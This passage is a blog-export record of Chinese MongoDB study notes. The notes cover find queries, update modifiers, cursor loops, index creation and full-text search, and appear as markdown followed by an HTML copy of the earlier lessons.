db.workmate.find(\n    {age:{$lte:30,$gte:25}},\n    {name:true,age:true,\"skill.skillOne\":true,_id:false}\n   )\n  \n  **日期查找**\n   MongoDB也提供了方便的日期查找方法,现在我们要查找注册日期大于2018年1月10日的数据,我们可以这样写代码。\n   \"D:\\工具\\工作学习\\monggoShell\\batch10.js\"\n   先声明一个日期变量,然后使用`大于符`($gt)进行筛选。\n\n  **总结**：这节课内容并不多,但如果你是个`DBA`(数据库管理员) 查找命令工作中每天都会用到,所以这节课的内容练习是必须的,如果你懒得动手,那接下来的课程你可能无法学会。\n\n## 第11节：查询：find的多条件查询(`$in/$nin`(有/无) `$or / $and / $not`(或/与/非))\n  很多时候我们需要查询的值`不只是有一个简单的条件`,比如我们现在要查询一下同事中是`33岁`和`25岁`的,还比如我们要查询同事中`大于30岁`并且`会PHP技能`的。MongoDB在这方面也支持的很好,我们来学习一下。\n  \n  **$in修饰符**\n   `in修饰符`可以轻松解决`一键多值`的查询情况。\n   就如上面我们讲的例子,现在要查询同事中年龄是25岁和33岁的信息。\n   > db.workmate.find(\n   >   {age:{$in:[25,33]}},\n   >   {name:1,\"skill.skillOne\":1,age:1,_id:0}\n   > )\n   `$in`相对的修饰符是`$nin`,就是查询`除了$in条件`以外的值,小伙伴们可以自己进行练习一下,这里我就不作过多的演示了。\n\n  **$or修饰符**\n   `$or修饰符`用来查询`多个键值`的情况,比如查询同事中大于30岁或者会做PHP的信息。\n   `$or修饰符`与`$in/$nin`主要区别 `$or`修饰符是两个Key值 `$in/$nin`修饰符是一个Key值 需比较记忆。\n  \n  **总结**：这节知识比较简单,但要`区分记忆`,很`容易搞混`。幸运的是这里已经为你准备好学习笔记。当你忘记的时候过来看看吧。\n\n## 第12节：查询：find的数组查询(`$all` `$in` `$size` `$slice(显示选项)`)\n  这节主要学习数组的查询,在学习update时就花了重墨去讲数组的操作,可见数组的操作在MongoDB中很受重视,因为稍微大型一点的项目,设计的数据集合都复杂一些,都会涉及数组的操作。\n  \n  **完善数据**\n   以前我们的`workmate集合`对数组涉及还很少,现在在数据中加入了`兴趣（interest）`,并且给每个人加入了一些兴趣,比如有写代码,做饭,看电影…\n   当然这些数据你可以自己随意构建,但是如果你不想自己费事费脑,这里也为你准备好了数据,你只要把以前的表删除（drop）掉,重新载入(load)就可以了。\n\n  **基本数组查询**\n   比如现在我们知道了一个人的爱好是’画画’,’聚会’,’看电影’,但我们不知道是谁,这时候我们就可以使用最简单的数组查询（实际工作中,这种情况基本不常用,所以这种查询只作知识点储备就可以了）。\n  \n   在终端中运行后,我们得到了数据。这时候我们说,想查出看兴趣中有看电影的员工信息。按照正常逻辑,应该使用下面的代码。\n\n  **$all-数组`多项`查询(类似 &&)**\n   现在我们的条件升级了,要查询出既喜欢`看电影`又`看书`的人员信息,也就是对数组中的对象进行查询,这时候要用到一个新的查询修饰符$all。看下面的例子：\n\n  **$in-数组的`或者`查询**\n   `$all`修饰符,需要`满足所有条件`; `$in`主要`满足数组中任意的一项`就可以被查出来(有时候会跟`$or`弄混)。比如现在要查询爱好中有看电影的或者看书的员工信息。\n  \n  **$size-数组`个数`查询**\n    \n  **$slice-`显示选项`**\n    展示数据时的判断条件,显示前几项或后几项。\n    db.workmate.find(\n      {},\n      {name:1,interest:{$slice:2},age:1,_id:0} \n    )\n\n  **总结**：如果你只看视频一定学不会,程序这东西必须要动手练习,我在所有的视频中都反复强调,目的没有别的就是想让你们真的学会,并应用到工作中去。\n\n## 第13节：查询：find的参数使用方法(`find参数[query,fields,limit,skip,sort]` `分页Demo` `$where`)\n  前边已讲3节查询,都是在操作`find`方法的`第一个参数(query)`和`第二个参数(fields)`。`find`还有几个常用的参数,这些参数多用在`分页`和`排序`上。这节我们就把这些常用的选项说一说,理解后我们演示一个分页的效果。\n\n  **find参数**\n    `query`：这个就是查询条件,`MongoDB默认`的第一个参数。\n    `fields`：（返回内容）查询出来后显示的结果样式,可以用`true(1)`和`false(0)`控制是否显示。\n    `limit`：返回的数量,后边跟`数字(number)`,控制`每次查询返回`的结果数量。\n    `skip`:跳过多少个显示,和`limit`结合可以实现分页。(number)\n    `sort`：排序方式,从小到大排序使用`1`,从大到小排序使用`-1`。\n\n  **分页Demo**\n   > db.workmate.find({},{name:true,age:true,_id:false}).limit(0).skip(2).sort({age:1});\n\n  **$where修饰符**\n   db.workmate.find(\n     {$where:\"this.age>30\"},\n     {name:true,age:true,_id:false}\n   )\n   这里的`this`指向的是`workmate(查询集合)`本身。这样我们就可以在程序中随意调用。虽然强大和灵活,但是这种查询对于`数据库压力`和`安全性`都会变重,所以在工作中`尽量减少`$where修饰符的使用。\n\n## 第14节：查询：find如何在js文本中使用(`hasNext` `forEach`)[基础部分完结]\n  前边使用`find`都是`JS`在文本中写完,然后复制到终端中执行,这样非常麻烦。在讲的过程中已经有很多小伙伴在问我如何像写`update`语句一样,在文本中直接运行。这节课我们就学习一下如何直接在文本中执行。\n  \n  **hasNext循环结果**\n   想在文本中执行我们的`find`语句要用到`游标`和`循环`的操作,先看一下代码,代码中我已经对每一句进行了注释。\n   > var db = connect(\"company\")  //进行链接对应的集合collections\n   > var result = db.workmate.find() //声明变量result,并把查询结果赋值给result\n   > //利用游标的hasNext()进行循环输出结果。\n   > while(result.hasNext()){\n   >     printjson(result.next())  //用json格式打印结果\n   > }\n   写完后,现在你只需要在终端中进行`load()`就可以执行了,再也不用麻烦的复制粘贴了。\n  \n  **forEach循环**\n   利用`hasNext循环`结果,需要借助`while`的帮助,MongoDB也为我们提供了`forEach循环`,现在修改上边的代码,使用forEach循环来输出结果。\n   > var db = connect(\"company\")  //进行链接对应的集合collections\n   > var result = db.workmate.find() //声明变量result,并把查询结果赋值给result\n   > //利用游标的hasNext()进行循环输出结果。\n   > result.forEach(function(result){\n   >     printjson(result)\n   > })\n   `作者`觉的`forEach循环`更为`优雅`。这两种方法都是非常不错的,凭借自己爱好进行选择吧。\n  \n  **总结**：那我们MongoDB的`基础部分`就全部讲完了,我们学会了它的`增、删、改、查`,你也可以使用MongoDB进行一些操作了。需要注意的是,只是这篇文章的完结,下篇文章我们进行讲解MongoDB,开始讲解MongoDB的`索引`。\n\n## 第15节：索引:构造百万级数据(`db.randomInfo.stats()`)\n  索引的`性能`体现必须要有`大量数据`才能看出来,你说你有10条20条数据,这是根本看不出来效果的,这节课就通过随机数的方法,创造出一个百万级数据的数据库出来。(随机插入数据,见mongoshell demo15.js)\n  **PS**:`索引`是什么？把数据当成一个字典,`索引`即`目录`。消耗`内存`和`硬盘`。\n  \n  **制作随机数方法**\n\n  **制作随机用户名**\n  \n  插入完成后,我们可以使用`db.randomInfo.stats()`命令查看数据中的数据条数。\n\n  **总结**:这节课主要是为讲解MongoDB的`索引`作准备,我们用`随机数`的方法构建了一个`百万级`的数据表,如果你有兴趣继续往下学习 练习,这节课必须动手做一下。以后这篇文章的学习全是基于这个代码。\n \n## 第16节：索引：索引入门(`ensureIndex` `getIndexes`)\n  集合中已建立 200万条数据,可以进行`索引`的操作了。我们先来建立一个索引,然后看看它的`查询性能`到底提升了多少倍。这节课的内容不会很难,主要掌握`索引的建立方法`即可。\n\n### 建立索引\n    db.randomInfo.ensureIndex({username:1})\n### 查看现有索引\n    db.randomInfo.getIndexes()   \n\n## 第17节：索引：复合索引(`复合索引的坑` `ensureIndex` `hint`)\n什么样的数据使用索引会变慢？\n`复合索引`的`使用`和`语法`\n通过这节 需要对`索引`使用的`时机`有所了解，避免画蛇添足，产生不必的麻烦。\n\n### 索引中的小坑\n+ 数据`不超万条`时，不需要使用索引。性能的提升并不明显，大大`增加了内存、硬盘 消耗`。\n+ 查询数据`超过表数据量30%`时，不要使用索引字段查询。实际证明会`比不使用索引更慢`，因为它`大量检索`了`索引表`和我们`原表`。\n+ `数字索引`，要`比字符串索引快`的多，在百万级甚至千万级数据量面前，使用数字索引是个明确的选择。\n+ 把你经常查询的数据做成一个`内嵌数据`（对象型的数据），然后集体进行索引。\n\n### 复合索引(`ensureIndex`)\n**复合索引就是两条以上的索引。**上节课我们已经把`username`字段建立了索引，我们现在把`randNum0`，这个字段也设置成索引。\n    db.randomInfo.ensureIndex({randNum0:1})\n\n建立好后，再用`查询索引状态`命令进行查询。\n    db.randomInfo.getIndexes()\n\n### 两个索引同时查询\n    var db = connect('company');\n    var rs= db.randomInfo.find({username:'7xwb8y3',randNum0:565509});\n\n从性能上看并没有什么特殊的变化，查询时间还是在4ms左右。MongoDB的`复合查询`是按照我们的`索引顺序`进行查询的。就是我们用`db.randomInfo.getIndexes()`查询出的数组。\n\n### 指定索引查询(`hint`)\n`数字`的索引要比`字符串`的索引`快`，这就需要一个方法来打破索引表的查询顺序，用我们自己`指定的索引`优先查询，这个方法就是`hint()`.\n\n    var rs= db.randomInfo.find({username:'7xwb8y3',randNum0:565509}).hint({randNum0:1});\n\n由于`数据量`和`复杂成都`一般，所以没有明显性能提升。工作中遇到`大数据`，会得到`好的效果`。\n\n### 删除索引(`dropIndex`)\n当索引`性能不佳`或`起不到作用`时，我们需要删除索引，删除索引的命令是`dropIndex()`.\n\n    db.randomInfo.dropIndex('randNum0_1'); // 索引的唯一ID\n\n这里需要`注意`的是删除时填写的值，并`不是 字段名称(key)`，`而是 索引查询表(getIndexes())中 name值`。\n\n### 总结：这节主要内容 `操作索引`，包括`复合索引 建立/删除`。使用 索引的 `窍门`。\n\n## 第18节：索引：全文索引(`$text` `$search`)\n有时候需要在`大篇幅文章`中`搜索关键词`，比如文章每篇都在`万字以上`，这时候想`搜索关键字`是非常`不容易`的，`MongoDB`为提供了`全文索引`。\n\n### 准备工作(建立集合 插入 数据)\n先建立`集合(collections)` —— `info`，然后`插入` 小段文章，`作用`就是为 建立 全文索引 提供数据，不再建立 百万级数据，只看效果。\n\n    db.info.insert({contextInfo:\"I am a programmer, I love life, love family. Every day after work, I write a diary.\"})\n    db.info.insert({contextInfo:\"I am a programmer, I love PlayGame, love drink. Every day after work, I playGame and drink.\"})\n\n再次强调 只是练习需要，实际工作中 简单数据 没必要 建立 全文索引。\n\n### 建立全文索引(`ensureIndex`)\n\n    db.info.ensureIndex({contextInfo:'text'})\n\n需要注意的是这里使用`text`关键词来`代表全文索引`，这里不再 `建立数据模型`。\n\n### 全文索引查找(`$text` `$search`)\n建立好了全文索引就可以查找了，查找时需要两个关键修饰符:\n\n+ $text:表示要在全文索引中查东西。\n+ $search:后边跟查找的内容。\n\n    db.info.find({$text:{$search:\"programmer\"}})\n\n### 多词查找(单词关系为 `或||`, 排除关键词`-`)\n`全文索引`是支持`多词查找`的，比如我们希望查找数据中有programmer，family，diary，drink的数据(单词关系属于 `或||` 的关系)，所以两条数据都会出现。\n\n    db.info.find({$text:{$search:\"programmer family diary drink\"}})\n\n如果不希望 查找带有`drink`这个单词的记录，我们可以使用`-`减号来排除。\n\n    db.info.find({$text:{$search:\"programmer family diary -drink\"}})\n\n### 转义符()\n`全文搜索`中`支持转义符`，比如 想 搜索的是 两个词(`love PlayGame`和`drink`)，这时候需要使用`\\`反斜杠来转意。\n\n    db.info.find({$text:{$search:\"\\\"love PlayGame\\\" drink\"}})\n\n### 总结\n`全文索引`在工作中比较常用,比如`博客文章`搜索、`长文件`的`关键词`搜索,都需要使用全文索引。\n\n## \n","slug":"SQL/NoSql/MongoDB/MongoDB学习笔记","published":1,"updated":"2018-09-05T06:33:18.507Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry3p00g0zodv02evfrzu","content":"<h1 id=\"MongoDB学习笔记-JS胖\"><a href=\"#MongoDB学习笔记-JS胖\" class=\"headerlink\" title=\"MongoDB学习笔记(JS胖)\"></a><a href=\"http://jspang.com/2017/12/16/mongdb/\" target=\"_blank\" rel=\"noopener\">MongoDB学习笔记(JS胖)</a></h1><p>(2018年1月26日 13:53:11)</p>\n<h2 id=\"第01节：认识和安装MongoDB\"><a href=\"#第01节：认识和安装MongoDB\" class=\"headerlink\" title=\"第01节：认识和安装MongoDB\"></a>第01节：认识和安装MongoDB</h2><blockquote>\n<p>MongoDB是<code>非关系型数据库</code><br>   关系数据库,是建立在关系模型基础上的数据库。<br>   安装步骤：<br>    1.去官网下载MongoDB,<a href=\"https://www.mongodb.com/,在网站中找到Download按钮。下载会有点忙,国外的服务器,你懂的。\" target=\"_blank\" rel=\"noopener\">https://www.mongodb.com/,在网站中找到Download按钮。下载会有点忙,国外的服务器,你懂的。</a><br>    2.下载后进行安装,安装没什么难度,但是对于新手建议选择默认安装,而不选择自己配置。等我们完全熟悉后再定制式配置。<br>    3.安装时如果有安全软件,会报一些拦截,一律允许就好,不允许会安装失败的。<br>    4.安装完成后,需要配置“环境变量”,目的是再命令行中直接使用,而不需要输入很长的路径了。（此步骤观看视频）</p>\n</blockquote>\n<p>   查看存在数据库命令：<code>show dbs</code><br>   查看数据库版本命令：<code>db.version()</code> </p>\n<h2 id=\"第02节：Mongo基本命令-1-show-dbs-use-xxdb-show-collections-db-MongoDB的存储结构\"><a href=\"#第02节：Mongo基本命令-1-show-dbs-use-xxdb-show-collections-db-MongoDB的存储结构\" class=\"headerlink\" title=\"第02节：Mongo基本命令-1(show dbs use xxdb show collections db MongoDB的存储结构)\"></a>第02节：Mongo基本命令-1(<code>show dbs</code> <code>use xxdb</code> <code>show collections</code> <code>db</code> <code>MongoDB的存储结构</code>)</h2><p>   接下来的几节直接上手<code>Mongo命令</code>,<code>MSSQL</code>和<code>MYsql</code>用的都是<code>Sql命令</code>。<br>   MongoDB的操作命令就是前端最熟悉的JavaScript命令。<br>   先来一个常用的赋值和输出命令,熟悉一下。（操作前你需要打开Mongo服务器和链接到服务器-也就是我们上节讲的<code>mongod</code>命令和<code>mongo</code>命令）在命令行中输入以下代码。<br>   需要注意的是这里的输出不再使用<code>console.log</code>(‘巴拉巴拉’),而是使用<code>print</code>(‘巴拉巴拉’),这个稍有区别。</p>\n<p>   <strong>MongoDB的存储结构</strong><br>    以前我们的关系型数据库的数据结构都是顶层是库,库下面是表,表下面是数据。但是MongoDB有所不同,库下面是集合,集合下面是文件,可以看下面这张图进行了解一下。</p>\n<pre><code>**存储解构不同**\n  关系型数据库\n    --数据库\n    --数据表\n    --数据行\n  非关系型数据库(MongoDB)\n    --数据库\n    --集合\n    --文件\n\n 在学习中我们可以对比记忆,这样才能更好的了解这些名词,其实数据表就是集合,数据行就是文件,当然这只是为了记忆,实质还是有区别的。\n</code></pre><p>   <strong>基础Shell命令</strong><br>    了解<code>存储结构</code>后,就可学习基础<code>Shell</code>命令,因 命令 较基础,以 列表形式展现,具体使用方法可到视频观看。<br>    <code>show dbs</code>:显示已有数据库. 如果你刚安装好,会默认有local、admin(config),这是MongoDB的默认数据库,我们在新建库时是不允许起这些名称的。<br>    <code>use admin</code>： 进入数据,也可以理解成为使用数据库。成功会显示：<code>switched to db admin</code>。<br>    <code>show collections</code>: 显示数据库中的<code>集合</code>（关系型中叫<code>表</code>,我们要逐渐熟悉）。<br>    <code>db</code>:显示当前位置. 也就是你当前使用的数据库名称,这个命令算是最常用的,因为你在作任何操作的时候都要先查看一下自己所在的库,以免造成操作错误。</p>\n<p>   <code>总结</code>：这节 学习已经 进入 <code>MongoDB</code> 世界,使用 比较简单,都是 基本命令, 敲回车就可使用,但还要多进行 练习。<code>重点</code> 要转变 以前<code>数据库存储结构的思想</code>,<code>掌握MongoDB的存储结构</code>。 </p>\n<h2 id=\"第03节：Mongo基本命令-2-“基本数据增删改查“-use-db-insert-find-findOne-update-remove-drop-dropDatabase-count\"><a href=\"#第03节：Mongo基本命令-2-“基本数据增删改查“-use-db-insert-find-findOne-update-remove-drop-dropDatabase-count\" class=\"headerlink\" title=\"第03节：Mongo基本命令-2(“基本数据增删改查“ use db insert find findOne update remove drop dropDatabase count)\"></a>第03节：Mongo基本命令-2(“基本数据<code>增删改查</code>“ <code>use db</code> <code>insert</code> <code>find</code> <code>findOne</code> <code>update</code> <code>remove</code> <code>drop</code> <code>dropDatabase</code> <code>count</code>)</h2><p>   学会基本的 数据 <code>增删改查</code><br>   数据操作基础命令：<br>    <code>use db</code>(建立数据库)：use不仅可以进入一个数据库,如果你敲入的库不存在,它还可以帮你建立一个库。但是在没有集合前,它还是默认为空。<br>    <code>db.集合.insert({&quot;&quot;:&quot;&quot;,&quot;&quot;:&quot;&quot;})</code>:新建数据集合和插入文件（数据）,<strong>当集合没有时,这时候就可以新建一个集合,并向里边插入数据。</strong> <code>Demo：db.user.insert({“name”:”jspang”})</code><br>    <code>db.集合.find( )</code>:查询所有数据,这条命令会列出集合下的所有数据,可以看到MongoDB是自动给我们加入了索引值的。<code>Demo：db.user.find()</code><br>    <code>db.集合.findOne( )</code>:查询第一个文件数据,这里需要注意的,所有MongoDB的组合单词都使用首字母小写的驼峰式写法。<br>    <code>db.集合.update({查询},{修改})</code>:修改文件数据,第一个是查询条件,第二个是要修改成的值。这里注意的是可以多加文件数据项的,比如下面的例子。<br>    <code>db.集合.remove(条件)</code>：删除文件数据,注意的是要跟一个条件。<code>Demo</code>:<code>db.user.remove({“name”:”jspang”})</code><br>    <strong>以下基本不用</strong><br>    <code>db.集合.drop( )</code>:删除整个集合,这个在实际工作中一定要谨慎使用,如果是程序,一定要二次确认。<br>    <code>db.dropDatabase( )</code>:删除整个数据库,在删除库时,一定要先进入数据库,然后再删除。实际工作中这个基本不用,实际工作可定需要保留数据和痕迹的。<br>    <code>db.collections.count({rule})</code></p>\n<h2 id=\"第04节：用js文件写mongo命令-var-db-connect-quot-dbName-quot\"><a href=\"#第04节：用js文件写mongo命令-var-db-connect-quot-dbName-quot\" class=\"headerlink\" title=\"第04节：用js文件写mongo命令(var db = connect(&quot;dbName&quot;) )\"></a>第04节：用js文件写mongo命令(<code>var db = connect(&quot;dbName&quot;)</code> )</h2><p>   命令行写<code>mongo</code>命令（shell）实在麻烦(无法忍受windows系统 命令行),这节学习用<code>JS</code>文件来写<code>shell命令</code>和<code>执行</code>。<code>JS</code>写<code>mongo</code>的<code>Shell</code>命令大部分是相同的,只有小部分不一样。<br>  <strong>把命令写入JS中</strong><br>    现模拟一个用户登录日志表 信息,用JS进行编写。在一个新建目录下,比如D:/mongoShell/,新建一个goTask.js文件。文件内容如下：</p>\n<blockquote>\n<p>goTask.js文件<br>var userName=”jspang”;    //声明一个登录名<br>var timeStamp=Date.parse(new Date());     //声明登录时的时间戳<br>var jsonDdatabase={“loginUnser”:userName,”loginTime”:timeStamp}; //组成JSON字符串<br>var db = connect(‘log’);   //链接数据库<br>db.login.insert(jsonDdatabase);  //插入数据</p>\n<p>print(‘[demo]log  print success’);  //没有错误显示成功<br>var userName=”jspang”;    //声明一个登录名<br>var timeStamp=Date.parse(new Date());     //声明登录时的时间戳<br>var jsonDdatabase={“loginUnser”:userName,”loginTime”:timeStamp}; //组成JSON字符串<br>var db = connect(‘log’);   //链接数据库<br>db.login.insert(jsonDdatabase);  //插入数据</p>\n<p>print(‘[demo]log  print success’);  //没有错误显示成功</p>\n</blockquote>\n<p>  <strong>执行JS文件</strong></p>\n<blockquote>\n<p>mongo goTask.js</p>\n</blockquote>\n<p>  总结：这节很好的解决 在终端写 命令行 的难题,虽然大部分Shell和在命令行中写法一样,但是也稍有不同,希望小伙伴们可以轻松掌握。 </p>\n<h2 id=\"第05节：批量插入的正确方法-“批量数据插入-以数组方式”-老版本MongoDB-batchInsert-一次插入不要超-48M-静态存储-批量插入性能测试-批量-gt-循环-数据库性能\"><a href=\"#第05节：批量插入的正确方法-“批量数据插入-以数组方式”-老版本MongoDB-batchInsert-一次插入不要超-48M-静态存储-批量插入性能测试-批量-gt-循环-数据库性能\" class=\"headerlink\" title=\"第05节：批量插入的正确方法(“批量数据插入 以数组方式” 老版本MongoDB batchInsert 一次插入不要超 48M 静态存储 批量插入性能测试 批量&gt;循环 数据库性能)\"></a>第05节：批量插入的正确方法(“批量数据插入 以<code>数组</code>方式” <code>老版本MongoDB batchInsert</code> <code>一次插入不要超 48M</code> <code>静态存储</code> <code>批量插入性能测试 批量&gt;循环</code> <code>数据库性能</code>)</h2><p>   在操作数据库时要注意两个能力：<br>    第一个是<code>快速存储能力</code>。<br>    第二个是<code>方便迅速查询能力</code>。</p>\n<p>   <strong>批量插入</strong><br>    批量数据插入是以<strong>数组</strong>的方式进行的（如果写错,可以3个回车可以切出来）。我们现在命令行中敲入下面的代码,我们可以看到数据顺利插入了。<br>    老版本MongoDB（3.2以前的版本基本都需要）是需要在<code>Insert</code>前加一个<code>batch</code>单词的,如下代码。<br>    <code>db.test.batchInsert()</code><br>    <strong>注意</strong>一次插入不要超过48M,<code>.zip</code>和<code>大图片</code>之类尽量用<code>静态存储</code>,MongoDB存储<code>静态路径</code>就好,这也算是一个规则。</p>\n<p>   <strong>批量插入性能测试</strong><br>    刚学了批量插入,那是循环插入快？还是批量插入快那？在一般人的认知里肯定是批量插入更快（其实这毋庸置疑）,但我们要拿出极客精神,探个究竟,试着写一个小Shell,来验证一下结果。<br>    先写一个<code>循环插入</code>方法：</p>\n<pre><code>`批量插入`代码:\n</code></pre><p>   <strong>总结</strong>：在工作中<code>一定</code>要<code>照顾数据库性能</code>,这也是你<code>水平的体现</code>,一个技术会了很简单,但是要精通不那么简单。学完这节,记得在工作中如果在循环插入和批量插入举棋不定,那就选批量插入吧,它会给我们更优的性能体验。 </p>\n<h2 id=\"第06节：修改：Update常见错误-只update修改项\"><a href=\"#第06节：修改：Update常见错误-只update修改项\" class=\"headerlink\" title=\"第06节：修改：Update常见错误(只update修改项)\"></a>第06节：修改：Update常见错误(<code>只update修改项</code>)</h2><p>   这节开始说一说<code>Update</code> 详细操作,先来看下常见错误,知道 困难 或者说 问题在哪里,再提出解决方案。这节会先演示一些错误的 <code>Update</code> 方法,然后再说正确的方法。希望不要误导小伙伴。<br>   <strong>错误：只update修改项</strong><br>    <code>Update</code>的使用方法需要注意<br>    db.xxxset.update({“”:””},<code>{&quot;&quot;:&quot;&quot;} || [] || variable</code>)(此方法属于整条数据修改,替换项需要整条数据)</p>\n<p>   <strong>正确修改方法</strong><br>    可以声明一个变量,然后把要改变数据的全部信息放入变量,最后执行修改操作。</p>\n<p>   现在这种方法才是正确的,数据修改正常了,但是你会发现写起来非常麻烦,而且特别容易写错。下节我们会介绍<code>update修改器</code>,可以很好的解决这个问题。 </p>\n<h2 id=\"第07节：修改：初识update修改器-set-set嵌套内容-unset-inc-multi-upsert\"><a href=\"#第07节：修改：初识update修改器-set-set嵌套内容-unset-inc-multi-upsert\" class=\"headerlink\" title=\"第07节：修改：初识update修改器($set/$set嵌套内容 $unset $inc multi upsert)\"></a>第07节：修改：初识update修改器(<code>$set/$set嵌套内容</code> <code>$unset</code> <code>$inc</code> <code>multi</code> <code>upsert</code>)</h2><p>   上节的<code>修改</code>用起来实在是<code>不够优雅</code>,这是我们一个伟大的前端不能接受的,所以我们要学习<code>update修改器</code>,来解决这个问题。<code>update修改器</code>可以帮助我们<code>快速</code>和<code>简单</code>的修改数据,让我们的操作更简单方便。<br>  <strong>$set修改器</strong><br>    用来修改一个指定的键值(key),这时候我们要修改上节的sex和age就非常方便了,只要一句话就可以搞定。</p>\n<blockquote>\n<p>db.workmate.update({“name”:”MinJie”},{“$set”:{sex:2,age:21}})<br>    修改好后,我们可以用db.workmate.find()来进行查看,你会发现数据已经被修改。<br>   <strong>修改嵌套内容(内嵌文档)</strong><br>db.workmate.update({“name”:”MinJie”},{“$set”:{“skill.skillThree”:’word’}})</p>\n</blockquote>\n<p>  <strong>$unset用于将key删除</strong></p>\n<blockquote>\n<p>db.workmate.update({“name”:”MinJie”},{$unset:{“age”:’’}})</p>\n</blockquote>\n<p>  <strong>$inc对数字进行计算</strong><br>   它是对<code>value值</code>的修改,但是修改的<code>必须是数字</code>,<code>字符串</code>是<code>不起效果</code>的。</p>\n<blockquote>\n<p>db.workmate.update({“name”:”MinJie”},{$inc:{“age”:-2}})</p>\n</blockquote>\n<p>  <strong>multi选项</strong><br>   <code>multi</code>是有<code>ture</code>和<code>false</code>两个值,<code>true代表全部修改</code>,<code>false代表只修改一个(默认值)</code>。</p>\n<p>  <strong>upsert选项</strong><br>   <code>upsert</code>也有<code>ture</code>和<code>false</code>两个值：<code>true代表没有就添加</code>,<code>false代表没有不添加(默认值)</code>。</p>\n<p>  <strong>总结</strong>：这节的内容非常多,主要学习了<code>update修改器</code>有关的一些东西。一定要多练习几遍,否则很快就会忘记的。</p>\n<h2 id=\"第08节：修改：update数组修改器-push-ne-addToSet-each-pop\"><a href=\"#第08节：修改：update数组修改器-push-ne-addToSet-each-pop\" class=\"headerlink\" title=\"第08节：修改：update数组修改器($push $ne $addToSet $each $pop)\"></a>第08节：修改：update<code>数组</code>修改器(<code>$push</code> <code>$ne</code> <code>$addToSet</code> <code>$each</code> <code>$pop</code>)</h2><p>  已学会一些<code>基础修改器</code>,这节主要学习<code>数组修改器的操作</code>,也可<code>修改内嵌文档</code>,也就是<code>对象形式的数据</code>。<br>  <strong>$push追加数组/内嵌文档值</strong><br>   <code>$push</code>的功能是<code>追加数组中的值</code>,但我们也经常用它操作<code>内嵌文档</code>,就是{}对象型的值。<br>    先看一个追加数组值的方式,比如我们要给小王加上一个爱好(interset)为画画（draw）：</p>\n<blockquote>\n<p>db.workmate.update({name:’xiaoWang’},{$push:{interest:’draw’}})<br>   当然<code>$push</code>修饰符还可以为<code>内嵌文档增加值</code>.<br>    比如我们现在要给我们的UI,增加一项新的技能skillFour为draw,这时候我们可以操作为：<br>db.workmate.update({name:’MinJie’},{$push:{“skill.skillFour”:’draw’}})<br>   <code>$push修饰符</code>在工作中是最常用的,因为 <code>数据</code>一般都会涉及<code>数组</code>和<code>内嵌文档</code>的操作,一定要掌握。</p>\n</blockquote>\n<p>  <strong>$ne查找是否存在</strong>(类似 <code>if(xxx === undefined || !xxx)/else</code> 判断)<br>    它主要的作用是,<code>检查一个值是否存在</code>,如<code>不存在</code>再 执行操作,<code>存在</code>就不执行,这个很<code>容易弄反</code>,记得我刚学的时候就经常弄反这个修改器的作用,给自己增加了很多坑。</p>\n<blockquote>\n<p>db.workmate.update({name:’xiaoWang’,”interest”:{$ne:’playGame’}},{$push:{interest:’Game’}})<br>   <strong>总结</strong>：没有则修改,有则不修改。</p>\n</blockquote>\n<p>  <strong>$addToSet 升级版的$ne</strong><br>    它是$ne的升级版本（查找是否存在,不存在就push上去）,操作起来更直观和方便,所以再工作中这个要比$en用的多。</p>\n<blockquote>\n<p>db.workmate.update({name:”xiaoWang”},{$addToSet:{interest:”readBook”}})</p>\n</blockquote>\n<p>  <strong>$each 批量追加</strong><br>    它可以传入一个<code>数组</code>,一次增加<code>多个值</code>进去,相当于<code>批量操作</code>,性能同样比循环操作要好很多,这个是需要我们注意的,工作中也要先组合成数组,然后用批量的形式进行操作。</p>\n<blockquote>\n<p>var newInterset=[“Sing”,”Dance”,”Code”];<br>db.workmate.update({name:”xiaoWang”},{$addToSet:{interest:{$each:newInterset}}})</p>\n</blockquote>\n<p>  <strong>$pop 删除数组值</strong><br>    <code>$pop</code>只删除一次,并不是删除所有数组中的值。而且它有<code>两个选项</code>,<code>1</code>和<code>-1</code>。<br>    1：从数组末端进行删除<br>    -1：从数组开端进行删除</p>\n<blockquote>\n<p>db.workmate.update({name:’xiaoWang’},{$pop:{interest:1}})</p>\n</blockquote>\n<p>  <strong>数组定位修改</strong><br>    有时候只知道修改数组的第几位,但并不知道是什么,这时候我们可以使用<code>interest.int</code>的形式。<br>    <code>例子</code> 比如我们现在要修改xiaoWang的第三个兴趣为编码（Code）,注意这里的计数是从0开始的。</p>\n<blockquote>\n<p>db.workmate.update({name:’xiaoWang’},{$set:{“interest.2”:”Code”}})</p>\n</blockquote>\n<p>  <strong>总结</strong>：这节主讲<code>数组</code>和<code>内嵌文档</code>有关的<code>update</code>修改器,内容很多,都需要不断熟练记忆。当然如果你记不住,你至少记住这个博客网址,因为技术胖把笔记已经给你整理好了。</p>\n<h2 id=\"第09节：修改：状态返回与安全-应答式-非应答式-db-runCommand-findAndModify\"><a href=\"#第09节：修改：状态返回与安全-应答式-非应答式-db-runCommand-findAndModify\" class=\"headerlink\" title=\"第09节：修改：状态返回与安全(应答式/非应答式 db.runCommand() findAndModify())\"></a>第09节：修改：状态返回与安全(<code>应答式/非应答式</code> <code>db.runCommand()</code> <code>findAndModify()</code>)</h2><p>  在操作数据库时,对<code>数据的修改</code>需要<code>足够的安全措施</code>,实际工作中,用<code>db.collections.update</code>不多,修改时都用<code>findAndModify</code>,它<code>返回</code>来一些必要的<code>参数</code>,让我们对<code>修改</code>多了很多<code>控制</code>力,<code>控制力的加强</code>也就是对<code>安全的强化能力加强</code>。</p>\n<p>  <strong>应答式写入</strong><br>   先了解一个概念：<code>应答式写入</code>。在<code>以前</code>的文章中,我们的操作都是<code>非应答式写入</code>,就是在<code>操作完</code>数据库后,它并没有给我们任何的<code>回应</code>和<code>返回值</code>,而是我们自己安慰自己写了一句话（print(‘[update]:The data was updated successfully’);）。这在<code>工作中 不允许</code>,因为根本<code>不能提现</code>我们<code>修改的结果</code>。<br>   <strong>应答式</strong>写入就会给我们<code>直接返回结果</code>(报表),结果里边的包含项会很多,这样我们就可以很好的进行程序的控制和安全机制的处理。有点像<code>前端</code>调用<code>后端接口</code>,无论作什么,后端都要给我一些<code>状态字节</code>一样。</p>\n<p>  <strong>db.runCommand()</strong><br>   